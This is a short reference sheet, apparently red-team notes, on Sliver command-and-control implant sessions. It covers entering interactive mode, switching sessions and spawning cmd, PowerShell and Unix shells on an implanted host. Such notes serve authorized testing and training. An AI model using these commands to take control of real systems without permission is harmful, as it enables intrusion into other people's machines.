# 06 - Interactive Session

## 6.1 - Help Menu

`sliver (IMPLANT_NAME) > interactive -h`

## 6.2 - Usage

`sliver (IMPLANT_NAME) > interactive`

`sliver (IMPLANT_NAME) > background`

`sliver > session -i <session_id>`

`sliver (IMPLANT_NAME) >`

## 6.3 - Spawn Shell

### 6.3.1 - Help Menu

```
sliver (IMPLANT_NAME) > shell -h

Start an interactive shell

Usage:
======
  shell [flags]

Flags:
======
  -h, --help                 display help
  -y, --no-pty               disable use of pty on macos/linux
  -s, --shell-path string    path to shell interpreter
  -t, --timeout    int       command timeout in seconds (default: 60)
```

### 6.3.2 - Usage

#### 6.3.2.1 - Windows

`sliver (IMPLANT_NAME) > shell -s "C:\\Windows\\system32\\cmd.exe"`

`sliver (IMPLANT_NAME) > shell -s "C:\\Windows\\system32\\WindowsPowershell\\v1.0\\powershell.exe"`

`sliver (IMPLANT_NAME) > shell -s "C:\\Windows\\SysWOW64\\WindowsPowershell\\v1.0\\powershell.exe"`

#### 6.3.2.2 - Linux

`sliver (IMPLANT_NAME) > shell -y -s /bin/sh`

`sliver (IMPLANT_NAME) > shell -y -s /bin/bash`

`sliver (IMPLANT_NAME) > shell -y -s /bin/zsh`

`sliver (IMPLANT_NAME) > shell -y -s /bin/dash`

`sliver (IMPLANT_NAME) > shell -y -s /bin/fish`